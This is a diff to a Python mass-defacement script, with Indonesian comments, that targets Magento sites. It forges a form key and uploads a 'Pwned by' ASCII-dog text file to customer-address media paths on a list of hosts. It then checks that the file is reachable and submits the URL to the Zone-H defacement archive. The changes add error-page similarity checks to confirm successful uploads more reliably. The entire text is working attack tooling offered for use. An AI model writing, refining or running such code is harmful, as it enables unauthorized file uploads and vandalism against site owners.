@@ -8,9 +8,10 @@ import urllib3
 import sys
 import threading
 from Queue import Queue
+from difflib import SequenceMatcher
 
 # ========== KONFIGURASI ==========
-DEFACER_NAME = "YourNick"   # <-- CHANGE WITH YOUR NICKNAME
+DEFACER_NAME = "yournick"   # <-- CHANGE WITH YOUR NICKNAME
 # =================================
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -38,16 +39,56 @@ def random_form_key(length=16):
     chars = string.ascii_letters + string.digits
     return ''.join(random.choice(chars) for _ in range(length))
 
-def verify_media_file(base_host, file_path, expected_content, timeout=15):
+def get_baseline_error_content(host, timeout=15):
+    random_path = ''.join(random.choice(string.ascii_lowercase) for _ in range(20))
+    test_url = host + '/' + random_path
+    try:
+        r = requests.get(test_url, verify=False, timeout=timeout)
+        if r.status_code == 404:
+            return r.text
+        elif r.status_code == 200:
 
-    possible_paths = ["/media/customer_address", "/pub/media/customer_address"]
+            return r.text
+        else:
+            return None
+    except:
+        return None
+
+def is_content_valid(html_content, expected_text, baseline_404_content):
+
+    html_lower = html_content.lower()
+    error_keywords = ['404', 'not found', 'page not found', 'error', 'missing', 'tidak ditemukan']
+    for keyword in error_keywords:
+        if keyword in html_lower:
+            return False
+
+
+    if baseline_404_content:
+
+        similarity = SequenceMatcher(None, html_content, baseline_404_content).ratio()
+
+        if similarity > 0.98:
+            return False
+
+
+    return expected_text.strip() in html_content
+
+def verify_media_file(base_host, file_path, expected_content, baseline_404_content, timeout=15):
+    possible_paths = [
+        "/media/customer_address",
+        "/pub/media/customer_address",
+        "/media"
+    ]
     for path_prefix in possible_paths:
         media_url = base_host + path_prefix + file_path
         try:
             check = requests.get(media_url, verify=False, timeout=timeout)
+            if check.status_code == 200:
+                if is_content_valid(check.text, expected_content, baseline_404_content):
+                    return True, media_url
+                else:
 
-            if check.status_code == 200 and expected_content.strip() in check.text:
-                return True, media_url
+                    return False, None
         except:
             continue
     return False, None
@@ -56,7 +97,6 @@ def upload_txt(host, timeout=15):
     host = normalize_url(host)
     form_key = random_form_key()
     
-    # ASCII art DOG (can be replaced)
     file_content = '''
    / \__
   (    @\___
@@ -64,8 +104,8 @@ def upload_txt(host, timeout=15):
  /   (_____/
 /_____/   U
   [[ Woof! Pwned by {} ]]'''.format(DEFACER_NAME)
-'''
-    file_name = "Jenderal92.txt"
+
+    file_name = "dog.txt"
 
     files = {
         "form_key": (None, form_key),
@@ -99,11 +139,13 @@ def upload_txt(host, timeout=15):
         if not file_path:
             return False, "JSON missing 'file'"
 
-        success, media_url = verify_media_file(host, file_path, file_content, timeout)
+        baseline_error = get_baseline_error_content(host, timeout)
+
+        success, media_url = verify_media_file(host, file_path, file_content, baseline_error, timeout)
         if success:
-            return True, media_url   
+            return True, media_url
         else:
-            return False, "File not accessible (404 or content mismatch) after upload"
+            return False, "File not accessible (detected as 404/error page) after upload"
 
     except requests.exceptions.Timeout:
         return False, "Timeout"
@@ -113,7 +155,6 @@ def upload_txt(host, timeout=15):
         return False, "Exception: {}".format(str(e)[:100])
 
 def submit_to_zoneh(full_media_url):
-    
     try:
         if not full_media_url.startswith(('http://', 'https://')):
             full_media_url = 'http://' + full_media_url
@@ -171,6 +212,7 @@ def main():
         print("[-] No targets found.")
         sys.exit(1)
 
+    # Hilangkan duplikat
     unique_hosts = {}
     for h in raw_hosts:
         norm = normalize_url(h)
